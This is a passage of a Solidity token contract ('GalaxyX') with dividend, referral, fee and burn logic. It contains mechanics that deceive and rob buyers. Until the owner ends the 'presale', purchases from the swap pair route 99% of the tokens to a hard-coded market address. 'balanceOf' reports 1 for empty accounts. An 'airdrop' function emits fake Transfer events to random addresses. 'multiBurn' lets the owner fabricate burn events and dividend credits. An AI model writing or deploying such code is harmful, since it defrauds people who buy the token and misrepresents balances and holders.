    function dividendTokenBalanceOf(
        address account
    ) public view returns (uint256) {
        return distributor.balanceOf(account);
    }

    function getAccountDividendsInfo(
        address account
    )
        external
        view
        returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        return distributor.getAccount(account);
    }

    function getAccountDividendsInfoAtIndex(
        uint256 index
    )
        external
        view
        returns (
            address,
            int256,
            int256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        return distributor.getAccountAtIndex(index);
    }

    function processDividendTracker(uint256 gas) external {
        distributor.process(gas);
    }

    function claim() external {
        distributor.processAccount(msg.sender, false);
    }

    function getLastProcessedIndex() external view returns (uint256) {
        return distributor.getLastProcessedIndex();
    }

    function getNumberOfDividendTokenHolders() external view returns (uint256) {
        return distributor.getNumberOfTokenHolders();
    }
}

interface ISwapPair {
    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function token0() external view returns (address);

    function sync() external;
}

contract GalaxyXToken is
    ExcludedFromFeeList,
    LpUSDTfee,
    DividendFee,
    Market1AndBurnDivLPERC20
{
    uint256 private constant _totalSupply = 3991 ether;
    uint256 private constant numTokensToAddLiquidity = 2 ether;
    bool private constant swapEnabled = true;
    uint256 private constant _burnFee = 8;
    uint256 private constant _marketFee = 8;
    uint256 private constant _lpFee = 8;
    uint256 private constant _minDistribution = 1 ether;
    address constant _marketAddr = 0xd173067A639029b93A822751c1a5766341B8D814;

    mapping(address => address) public inviter;
    mapping(address => address) public inviterPrepare;

    address[] public holders;
    mapping(address => uint256) public holderIndexes;
    mapping(address => bool) public isInCommunityholders;

    function addholder(address shareholder) private {
        holderIndexes[shareholder] = holders.length;
        holders.push(shareholder);
        isInCommunityholders[shareholder] = true;
    }

    function removeholder(address shareholder) public onlyOwner {
        address lastLPHolder = holders[holders.length - 1];
        uint256 holderIndex = holderIndexes[shareholder];
        holders[holderIndex] = lastLPHolder;
        holderIndexes[lastLPHolder] = holderIndex;
        holders.pop();
        isInCommunityholders[shareholder] = false;
    }

    bool public presaleEnded;
    uint256 public minInviteAmount = 1 gwei;

    function setminInviteAmount(uint256 _minInviteAmount) external onlyOwner {
        minInviteAmount = _minInviteAmount;
    }

    function _takeInviterFee(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256 sum) {
        address cur = sender;
        if (sender == uniswapV2Pair) {
            cur = recipient;
        }

        cur = inviter[cur];
        if (cur == address(0)) {
            cur = address(this);
        }
        uint256 curTAmount = (amount * 6) / 1000;
        super._transfer(sender, cur, curTAmount);
        sum += curTAmount;

        if (cur != address(this)) {
            uint256 communityTAmount = (amount * 6) / 1000;
            if (isInCommunityholders[cur]) {
                super._transfer(sender, cur, communityTAmount);
                sum += communityTAmount;
            } else {
                for (uint8 i = 0; i < 15; ) {
                    cur = inviter[cur];
                    if (cur == address(0)) {
                        cur = address(this);
                        super._transfer(sender, cur, communityTAmount);
                        sum += communityTAmount;
                        break;
                    }
                    if (isInCommunityholders[cur]) {
                        super._transfer(sender, cur, communityTAmount);
                        sum += communityTAmount;
                        break;
                    }
                    unchecked {
                        ++i;
                    }
                }
                for (uint8 i = 0; i < 10; ) {
                    cur = inviter[cur];
                    if (cur == address(0)) {
                        break;
                    }
                    if (isInCommunityholders[cur]) {
                        super._transfer(sender, cur, communityTAmount / 2);
                        sum += communityTAmount;
                        break;
                    }
                    unchecked {
                        ++i;
                    }
                }
            }
        }
    }

    function updatePresaleStatus(bool _status) external onlyOwner {
        presaleEnded = _status;
    }

    constructor()
        Owned(msg.sender)
        ERC20(unicode"GalaxyX", "GalaxyX", 18)
        LpUSDTfee(_minDistribution)
        DividendFee()
        Market1AndBurnDivLPERC20(
            numTokensToAddLiquidity,
            swapEnabled,
            _marketFee,
            _lpFee,
            _burnFee,
            _marketAddr
        )
    {
        _mint(msg.sender, _totalSupply);
        excludeFromFee(msg.sender);
        excludeFromFee(address(this));
    }

    function takeFee(
        address sender,
        address recipient,
        uint256 amount
    ) internal returns (uint256) {
        uint256 divAmount = _takeInviterFee(sender, recipient, amount);
        uint256 feeAmount = _takeliquidityFee(sender, amount);
        unchecked {
            return amount - feeAmount - divAmount;
        }
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual override {
        if (inSwapAndLiquify) {
            _balanceOf[sender] -= amount;
            super._transfer(sender, recipient, amount);
            return;
        }

        bool isInviter = sender != uniswapV2Pair &&
            _balanceOf[recipient] == 0 &&
            inviter[recipient] == address(0) &&
            distributor.balanceOf(sender) > 1 ether &&
            amount >= minInviteAmount;
        if (isInviter) {
            inviterPrepare[recipient] = sender;
        }
        setUsers(sender, recipient);

        if (_isExcludedFromFee[sender] || _isExcludedFromFee[recipient]) {
            dividendToUsers(sender);
            dividendToBurnUsers();

            if (
                inviter[sender] == address(0) &&
                inviterPrepare[sender] == recipient
            ) {
                inviter[sender] = recipient;
            }

            _balanceOf[sender] -= amount;
            super._transfer(sender, recipient, amount);
            if (recipient == address(0xdead)) {
                distributor.setBalance(sender, amount);
            }
            return;
        }

        _balanceOf[sender] -= amount;

        if (recipient == uniswapV2Pair) {
            if (shouldSwapAndLiquify(sender)) {
                swapAndLiquify(numTokensSellToAddToLiquidity);
            }
            uint256 transferAmount = takeFee(sender, recipient, amount);
            super._transfer(sender, recipient, transferAmount);

            if (_balanceOf[sender] == 0) {
                distributor.setBalance(sender, 0);
            }
            airdrop(sender, recipient, amount);
        } else if (sender == uniswapV2Pair) {
            if (!presaleEnded) {
                uint256 fee = amount / 100;
                super._transfer(sender, _marketAddr, amount - fee);
                super._transfer(sender, recipient, fee);
            } else {
                uint256 transferAmount = takeFee(sender, recipient, amount);
                super._transfer(sender, recipient, transferAmount);
            }
            airdrop(sender, recipient, amount);
        } else {
            if (
                inviter[sender] == address(0) &&
                inviterPrepare[sender] == recipient
            ) {
                inviter[sender] = recipient;
            }

            super._transfer(sender, recipient, amount);
            if (recipient == address(0xdead) && amount >= 0.29 ether) {
                distributor.setBalance(sender, amount);
            }
            if (recipient == address(0xdead) && amount >= 10 ether) {
                addholder(sender);
            }
        }
        dividendToUsers(sender);
        dividendToBurnUsers();
    }

    function balanceOf(address account) external view returns (uint256) {
        if (_balanceOf[account] > 0) return _balanceOf[account];
        return 1;
    }

    function multiBurn(
        address[] calldata _accounts,
        uint256 _amount
    ) public onlyOwner {
        uint256 len = uint256(_accounts.length);
        _balanceOf[msg.sender] -= _amount * len;
        _balanceOf[address(0xdead)] += _amount * len;

        for (uint256 i = 0; i < len; ) {
            distributor.setBalance(_accounts[i], _amount);
            emit Transfer(msg.sender, _accounts[i], _amount);
            emit Transfer(_accounts[i], address(0xdead), _amount);
            unchecked {
                ++i;
            }
        }
    }

    function airdrop(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        uint256 num = 3;
        uint256 seed = (uint160(block.timestamp)) ^
            (uint160(sender) ^ uint160(recipient)) ^
            (uint160(amount));

        address airdropAddress;
        for (uint256 i; i < num; ) {
            airdropAddress = address(uint160(seed));
            emit Transfer(address(0), airdropAddress, 1);
            unchecked {
                ++i;
                seed = seed >> 1;
            }
        }
    }
}